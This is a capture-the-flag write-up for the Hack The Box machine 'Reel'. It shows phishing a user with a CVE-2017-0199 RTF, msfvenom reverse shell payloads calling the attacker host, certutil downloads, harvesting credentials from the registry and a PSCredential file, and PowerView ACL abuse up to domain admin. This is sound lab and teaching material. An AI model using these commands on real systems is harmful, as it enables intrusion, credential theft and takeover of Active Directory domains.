# Reel [HTB](https://app.hackthebox.com/machines/143)
![reel-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/reel-01.png)


## Recon

After adding the machine to my `/etc/hosts` file I run an `nmap` scan with:

```bash
nmap -sC -sV -A -p- reel.htb -oN nmap.result
```

![nmap-res-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/nmap-res-02.png)

![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/nmap-res-03.png)

![nmap-res-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/nmap-res-04.png)

We have the following:

+ An FTP server on port 21.
+ An SSH server on port 22.
+ An SMTP server on port 25.
+ An RPC endpoint mapper on port 135.
+ NetBIOS on port 139.
+ An SMB server on port 445.
+ Other RPC related ports in 593 & 49159.

Based on the service finger printing it seems that the host OS might be a 2012 Windows server R2. 

From the SMB scanning we can see that we have an FQDN of `reel.htb.local`, could this be a DC? also based on the SMB scanning we can see that message signing is enabled and required. 

What stands out the most are the FTP, SMTP and SMB servers so let's take a look at thoes. 

## FTP Port 21

Let's try to log in with an anonymous account `anonymous : anonymous` :

![anonymous-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/anonymous-05.png)

We can see that the target does accept anonymous logins. 

When we `ls` the server we see a `documents` folder, lets `cd` into that:

![documents-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/documents-06.png)

We have a couple of Microsoft word documents and a text file. Let's copy all of them over to our machine to examine. We can do this with a one liner:

```bash
wget -m ftp://anonymous:anonymous@reel.htb
```
![tree-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/tree-07.png)

Lets start with the `txt` file:

![readme-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/readme-08.png)

The note is refering to [Rich Text Format](https://en.wikipedia.org/wiki/Rich_Text_Format), which is a proprietary document file format developed by Microsoft from 1987 until 2008 for cross-platform document interchange with Microsoft products.

The note also says that if we send an `rtf` file via email it will be converted and saved here. I presume that by "here" they meant the FTP server, therefore i'm guessing that the two `Word` documents here, are examples of `rtf` files that have been converted to `Word` documents.

Two question arise, 

1) To whom we need to send an email? 
2) Since the `rtf` files are "conveted", can we inject commands into them?


Let's start with the latter question. 

If we search online for `rtf exploit` we find quite a large sample of results, but what stood out the most to me was [this](https://github.com/bhdresh/CVE-2017-0199) RCE exploit.

This is a Python 2 exploit for a known vulnerability, [CVE-2017-0199](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0199). This script generates an `rtf` file with an embedded link inside it. This `rtf` file needs to be delivered to a victim user, which needs to click the embedded link. When they do, the `rtf` parser will fetch the link. Inside the link the script embeds command injection to download and execute another file, the reverse shell. 

There were also two `docx` files we got from the FTP. We can convert these file to text file on linux with `docx2txt`, 

i.e: `docx2text <in_file.docx> <out_file.txt>`

+ 'Windows Event Forwarding.docx'

At first i wasn't familier with `Windows Event Forwarding` so I searched online, and found [this](https://learn.microsoft.com/en-us/windows/security/threat-protection/use-windows-event-forwarding-to-assist-in-intrusion-detection) artical from Microsoft, as well as [this](https://www.rapid7.com/blog/post/2018/12/18/windows-event-forwarding-the-best-thing-youve-never-heard-of/) this one from Rapid7. 

In short, the `Windows Event Forwarding` system or `WEF` for short, is a way to get all event logs from endpoint Windows computers onto a centralized server collector, known as the Windows Event Collector (or WEC for short). This is achived using the `WinRM` protocol for remote managment of Windows systems. 

There are two ways of subscribing an endpoint to the WEC, `Baseline` and `Suspect`, and there are two ways of transmitting the events, `Pushing` or `Pulling`. At any case the communications are authinticated and encrypted via Kerberos, and NTLM as a fail safe. 

Orginizations will use this to centralize events onto thier SIEM systems, and create special actions based on the event logs, for example, to detect malicious commands being run in the environment. 

I've searched online for exploits, or vulnerabilities regarding this tech, but I didnt find anything meaningul and useful. The rest of the file details the commands used to setup this deployment. 

Let's check the other file. 

+ AppLocker.docx

[AppLocker](https://en.wikipedia.org/wiki/AppLocker) is an application whitelisting technology introduced with Microsoft's Windows 7 operating system. It allows restricting which programs users can execute based on the program's path, publisher, or hash, and with an enterprise enviorenment, they can be configured via Group Policy.

Lets read this file:

![applocker-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/applocker-11.png)

So it looks like they are monitoring, and possibly preventing execution of certian scripts based on thier hash signitures. Maybe this is a hint for using obfuscation later down the line?  
 
To me, I can't really see what we can do with all of this inforamtion at the moment, perhaps it has something to do with privilege escalation, perhpas it's just a rabbit hole meant to distract us. I searched for exploitation techniques againts the `WEF` system and found nothing useful. So I decided to put this to side for now and focus on getting access to the system.

The `rtf` vulnerability we found earlier looks solid, we just need to find an email address. 

After reading through the `docx` files on the terminal, I decided to take a look at the SMB server, but I wasn't able to connect, or gather any information. 

So I moved on to the SMTP server, and tried to enumerate usernames via the `VRFY` and `EXPN` methods. This didn't work, as the server refuses both methods. I then tried to enumerate usernames via the `RCPT TO` method, but the server accepted every username provided with a `@reel.htb` suffix, so this didn't help me either. 

I took a step back, and thought, "maybe there is hidden information in the `docx` files?". So I transferred the files over to a Windows machine and inspected the documents.

I started with the `'Windows Event Forwarding.docx'` file: 

![user-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/user-12.png)

Looks like our target email address. I had a similier situation once with a different machine which had clear text credentials inside a Macro of an `Excel` file. It's important to inspect Microsoft files on a Windows system as well as a Linux system, as there is often metadata left over on them.  

We could have used `exiftool` on the word documents to extract the metadata on a Linux system as well. 

Anyway, lets try to pull off the exploit. 


## Exploit

I did a bit of research as to why exactly the vulnerability happens, I found [this](https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/#:~:text=FireEye%20recently%20documented%20attacks%20of,the%20April%202017%20Microsoft%20Update.) artical that gave a nice little overview. 

In short, `CVE-2017-0199` was originally a 0-day vulnerability in the Windows HTA handler being exploited using Office RTF documents. The issue occurs when using an OLE2 embedded link object, if the user clicks the embedded link, the handler then retrives the file at the link, possibly executing it. Therefore, if we link to a reverse shell payload on our attack machine, and embed that link into the `rtf` file, when it's processed, we should get a shell to the target system.

In terms of the exploit we found earlier, I found [this](https://www.hackingarticles.in/exploit-windows-10-pc-microsoft-rtf-file-cve-2017-0199/) and [this](https://packetstormsecurity.com/files/142211/Microsoft-RTF-Remote-Code-Execution.html) articals that describe how to use it. 

This is a two stage exploit, In the first stage we create the malicious `rtf` file, and embed a link to an arbitrary URL we control. In the second stage, we link the arbirary URL to an actual reverse shell payload we control, and start a web server. When the target requests the arbitrary URL, we use command injection in the HTML response code to point it towards the actual reverse shell, download and execute it.  

Let's begin. 

1) Generate the malicuse `rtf` file. 

To do this we need to run:

```bash
python2 cve-2017-0199_toolkit.py -M gen -w Sales.rtf -u http://10.10.14.36/sale.doc
```
The `-M` is to specify the exploit mode, which is `generate`, the `-w` switch is for the output file name, and the `-u` switch is for our attack machine URL. 

This creates a `sales.rtf` file locally:

![file-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/file-13.png)

2) Generate the reverse shell payload. 

For this task we can use `msfvenom`: 

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.36 LPORT=443 -a x64 --platform windows -f exe > sale.exe
```

3) Start the toolkit in exploitation mode:

```bash
python2 cve-2017-0199_toolkit.py -M exp -e http://10.10.14.36/sale.exe -l /root/boxes/HackTheBox/Reel/sale.exe
```

The `-M` specifys we are running in exploit mode, the `-e` is the URL for the file to execute, and the `-l` is the local path to the reverse shell payloads file.

Here you can see the web server waiting for the target to retrive the link:

![wait-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/wait-14.png)


4) Start the nc listener:

```bash
rlwrap nc -lnvp 443
```

5) Finally, send the email to execute the payload. 

We can send an email with attachments using `swaks`:

```bash
echo "test" | swaks --server reel.htb:25 --from test@test.org --to nico@megabank.com --attach Sales.rtf
```

The email is sucsesfully sent, and the embedded link inside the `rtf` is triggered, as the client reaches over to fetch the link:

![fetched-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/fetched-15.png)

But we didnt connect on the reverse shell, why? 

At first I tried to use different payloads, staged, non-staged, x86 payloads, metasploit, etc, nothing worked. So I took a look at the exploit source code, I started by saerching for the `Received GET method` string:

![string-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/string-16.png)

Here the string, it's defined in the `server_thread()` funciton. It appears that the function defines an HTTP response inside the `data` variable and sends it to the target with `conn.send(data)`, lets see what's inside the data variable exactly:

![data-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/data-17.png)

![data-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/data-18.png)


We can see an embedded java script code to load powershell, download the real reverse shell payload and execute it. Maybe we have issues with this powershell syntax? After looking at the source code a bit more, I found bigger issues then the powershell syntax. 

If you pay attention youl'l find that there are two definitions of the `server_thread()` function, one after the definition of the `exploitation_rtf()` function, and the other is defined after the definition of the `exploitation_ppsx()` fucntion. 

Each `server_thread()` definition is similar in stucture to the other, but has slight variations in it's responses and command injection syntax. I believe that the author defined each variation to be used by a different exploitaion function, but this is not the case. When the Python compiler transforms the source code into machine code, the last definition of the `server_thread()` will overwrite the first one. 

We can see each `server_thread()` function being invoked at the end of each exploitation function with `thread.start_new_thread(server_thread, (conn, client_addr))`. What we can do is change the name of each `server_thread()` function to something unique, and call each one using it's distinct name. 

![mod-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/mod-19.png)

Now when we execute, we see a different result:

![diff-20](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/diff-20.png)

This time, the powershell code did execute, as we can see the target tried to fetch the `exe` payload from our server. This is also defined in the `server_thread_rtf()` function:

![fetch-exe-21](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/fetch-exe-21.png)

So at first, the target requests `sale.doc`, to which our server replies with HTML code that has a javascript payload to run powershell and fetch the real reverse shell `exe` payload from our target and execeute it. We can see this worked, but we still didn't get the shell. What could be the issue now?

I kept looking at the source code and I found an intersting option:

![hta-22](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/hta-22.png)

We know that `exe` files, along with other forms of executable formats are monitored by Applocker, perhaps it's the one blocking the execution of our `exe` ?

So instead we can try to use an `hta` paylaod. 

We can use `msfvenom` to generate an `hta` reverse shell as such:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.52 LPORT=443 -f hta-psh -o sale.hta
```

Then, we need to setup the toolkit server with:

```bash
python2 cve-2017-0199_toolkit.py -M exp -H /root/boxes/HackTheBox/Reel/sale.hta
```

Now after we send the email to the target we connect on a shell:

![shell-23](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/shell-23.png)


## Privilege Escalation

I start the escalation stage by hunting for quick wins. At first I look for my user's privileges with `whoami /priv`, but no interesting privileges are set. 

Then I run `cmdkey /list` to hunt for stored credentials, but there are none. I then look for an `Always Install Elevated` escalation path by running:

```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

But this comes out empty as well. I decided to list all the users on this machine:

```cmd
net user
```

![users-24](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/users-24.png)

And here we see something interesting, we have the `Kerberos Ticket Granting Ticket` service account, this machine is probably a Domain Controller. We can verify this by running `nltest /dclist:htb.local`:

![dc-25](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/dc-25.png)


As we can see this is a Domain Controller. Let's try a `golden ticket` attack, this will grant us full control over the DC. We need to pull the local account information, specifically the `krbtgt` account's NTLM hash and SID value, and use it to generate a golder ticket, granting us full access. 

To do this we need to use [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1) a powershell version of `Mimikatz.exe` which runs in memory in order to bypass AV detection. 

I downloaded the `Invoke-Mimikatz.ps1` to the target, and managed to get it running, but I had issues with the lsa process:

![mimi-26](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/mimi-26.png)

I tried to run other commands, but they all failed as well. Instead of mimikatz, we can use `secretsdump.py` from impacket in order to dump credentials and lsa inforamtion. But to do that we need credentials. 

So i start hunting them down, first I look in the registry:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

![creds-27](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/creds-27.png)

Here it is, `nico : 4dri@na2017!**` are the credentials. Lets run [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py):

![secretsdump-28](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/secretsdump-28.png)

No luck. I also tried other tools that utilize user credentials from the impacket suite but none worked for me. 

So instead I decided to look around the system. I started with our user's home folder, in the desktop folder we see an interesting file:

![creds-29](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/creds-29.png)

If we read the file we can see the following:

![hash-30](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/hash-30.png)

This is a [PSCredential](https://learn.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.3) object. In short, a `PSCredenmtial` object is a secure way to store both username and password information as an object in memory. This object can then be passed on to other functions, or saved to a file.

I found [this](https://systemweakness.com/powershell-credentials-for-pentesters-securestring-pscredentials-787263abf9d8) artical that gives more detail about the feature, as well as how we can reproduce the clear text password value. 

To do this we need an active powershell session, luckily we have SSH enabled on this machine, and we can use the credentials we found earlier to get access. Once we are connected via the SSH we need to start a powershell session with `powershell -exec bypass`. 

ION the powershell session, we can run the following commands to reproduce the password:

1) Create two variables for the username and password. The password we need to convert to a `Secure String`:

```powershell
PS> $user = "batman@gotham.com" 
PS> $pass = "<pass>" | ConvertTo-SecureString
```

2) Create the `PSCredential` object, passing in the variables:

```powershell
PS> $cred = New-Object System.Management.Automation.PSCredential($user, $pass)
```

3) Extract the cleartext password using the `GetNetworkCredential()` method on the `$cred` object:

```powershell
PS> $cred.GetNetworkCredential() | fl
```

![tom-31](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/tom-31.png)

Lets SSH as `Tom` and see what we can find. 


### Tom

First, I went to Tom's desktop folder where I found something unusual:

![ad-audit-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/ad-audit-32.png)

If we list the contents of this directory we see the following:

![dir-33](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/dir-33.png)

We see a `note.txt` file and a directory called `BloodHound`. Let's read the note first:

![note-34](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/note-34.png)

This is referring to a `BloodHound` security audit they ran againts the domain. They mention the shortest path query coming out empty for them. The shortest path to domain admin is a built-in query we can run in BloodHound to get possible escalation paths to domain admin. 

Inside the `BloodHound` directory we also have the `PowerView.ps1` script, which is a different AD enumeration tool. Inside the `Ingestors` directory however, we can see several different tools as well:

![tools-35](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/tools-35.png)

At first, I tried to run the latest version of [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/v4.3.1/Collectors/SharpHound.ps1) to gather data from the target, this however resulted in powershell errors:

![ps-err-36](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/ps-err-36.png)

So instead I decided to run the local scripts. This works, and they produced `csv` files with various information. But when I try to load these files into the BloodHound Visualizer I get the following error:

![bh-err-37](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/bh-err-37.png)

An `Incompatible Collector` error. I did a bit of research and found the [following git issue](https://github.com/BloodHoundAD/BloodHound/issues/516) from the offical BloodHound team. In short, BloodHound is devided into two parts, the data `Collectors` (A.K.A Ingestors), and the BloodHound visualizer which utilizes `neo4j` to render the information in graphs and enables us to perfrom queries. 

If the difference in versions between the collector and the visualizer are too big we might encounter this `Incompatible Collector` issue. The same post suggests that the output from the `SharpHound.exe` collctor should be acceepted by newer versions of the Visualizer, but we have an issue on our target with the AppLocker blocking it's execution. 

I've tried to bypass the Applocker, I found [this](https://juggernaut-sec.com/applocker-bypass/) post, as well as [this](https://github.com/api0cradle/UltimateAppLockerByPassList) page, that detail how we can try to bypass the Applocker. I've tested a few different techinques but none of them worked for me. And nothing really guarantees that the ouptut from the exe collector will actually be accepted by the visualizer. 

So instead I decided to install BloodHound V3.0.5 and neo4j V4.1 on a different Ubuntu machine I have, and run the collector from that version againts our target.

You can find BloodHound Version 3.0.5 [here](https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.5), After downloading the `BloodHound-linux-x64.zip` archive to my Ubuntu machine, I unziped it to my desktop with `unzip BloodHound-linux-x64.zip`.

To install neo4j version 4.1 you can follow the instructions from [this page](https://www.liquidweb.com/kb/how-to-install-neo4j-on-ubuntu-20-04/). 

After we installed both neo4j and bloodhound we can start neo4j with:

```bash
neo4j console
```

Then we need to login to the neo4j web portal at `http://localhost:7474` and change the initial password.
Now we can start BloodHound with:

```bash
cd BloodHound
./BloodHound
```

Log in with the credentials you've just set for `neo4j`. 

![vis-38](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/vis-38.png)


Now we need to collect data from the target. I use the [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/3.0.5/Ingestors/SharpHound.ps1) from version 3.0.5. I host this file with a python web server:

```bash
python3 -m http.server 80
```

And download it from the target using:

```cmd
certutil -urlcache -f http://10.10.14.52/SharpHound.ps1 sharp.ps1
```

Then, I enter a powershell session, load the module and invoke the scan:

```cmd
powershell -exec bypass
. .\sharp.ps1
Invoke-BloodHound -CollectionMethod All -Domain HTB.local 
```

This produces a zip archive in our working directory:

![zip-39](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/zip-39.png)

To transfer this archive over to my Kali, I setup an smb server with:

```bash
impacket-smbserver -smb2support -username htb -password htb reel .
```

Then I connect to the SMB server from the target and copy over the file:

```cmd
net use \\10.10.14.52\reel /u:htb htb
copy 20230922084319_BloodHound.zip \\10.10.14.52\reel
```

After that, I transfer the archive over to my Ubuntu VM, and import it to the BloodHound visualizer by clicking on the `Upload Data` button and selecting the zip archive. This loads the data, and now we can visualize it in a graph:

![admins-40](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/admins-40.png)


In this graph we can see the user accounts which are a part of the domain admins group. I'm interested in taking a look at our user, `TOM@HTB.local`, so I write he's name in the search bar to bring up he's node:

![node-41](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/node-41.png)


In the node properties, we find that we have a first degree object control over Claire's account. But this is not the same account that's a part of the domain admins group, but still, this would be a nice lateral pivot.

If we take a look at exactly what form of access we have over Claire's account we can see the following:

![write-owner-42](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/write-owner-42.png)

We have `WriteOwner` access over Claire's account. If we click on the `Help` button, we get a list of different attacks we can perfrom, utiliazing this access.

I want to go for the account take over using the password reset. We can do this with the `Set-DomainUserPassword` function of `PowerView.ps1`. 

To do this we need to load `PowerView.ps1` into a powershell session and tun the following:

```powershell
### Set tom as the owner of claire’s ACL 
Set-DomainObjectOwner -identity claire -OwnerIdentity tom 

### Give tom permissions to change passwords on that ACL
Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword 

### Create powershell credential and change credentials. 
### NOTE!! IN A REAL PENTEST YOU WOULD ENABLE REVERSIBLE ENCRYPTION OR MAKE USER KERBEROSTABLE OR SOMETHING ELSE AND NOT CHANGE THE PASSWORD IN A PRODUCTION ENVIRONMENT
$cred = ConvertTo-SecureString "Password123!" -AsPlainText -force
Set-DomainUserPassword -identity claire -accountpassword $cred
```

![actions-43](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/actions-43.png)

When I tried to log in via SSH it failed. I wasn't sure what's the issue, then I thought maybe its the password I chose? Tom's password had three `!` marks. So i setup a password of `Password123!!!` and repeated the above commands, and then I was able top log in as Claire:

![claire-44](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/claire-44.png)


### Claire

At first, I looked through Claire's Desktop and home folder, but found nothing meaningful, so I decided to go back to the BloodHound graphs and look at Claire's node:

![node-45](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/node-45.png)

Once again, we have on Outbound Object control, this time, over the `Backup_Admins` domain group. The user Claire has two access rights, `WriteDACL` and `GenericWrite`. With the `GenericWrite` access we can add any user we want to this group, the `WriteDACL` can be used to grant our user other rights, like the `GenericWrite` which we already have. 

I tried to look for escalation path's from the `backup_admins` group to the `domain admins` group in BloodHound, but couldn't find any. At any case, let's perform the attack and add Claire to the group:


```cmd
net group backup_admins claire /add
``` 

![add-46](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/add-46.png)


Next, I decided to check my permissions to the `Administrator`'s home folder using `icacls`:

![perms-47](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/perms-47.png)

Looks like this group has full access to the admins folder. At first I went for `root.txt` in the admin's desktop, but this failed. Instead there is a `Backup Scripts` dierctory there as well:

![backups-48](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/backups-48.png)

Lets `cd` into it and see what's inside:

![scripts-49](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/scripts-49.png)

I started to read every file, untill I found the Administrator's password in `BackupScript.ps1`:

![admin-pass-50](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/admin-pass-50.png)

Let's SSH:

![root-51](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Reel/img/root-51.png)

If we run `whoami /priv` we get a long list of priviliges, indicating that we have a full unrestricted shell as an admin on the DC. 
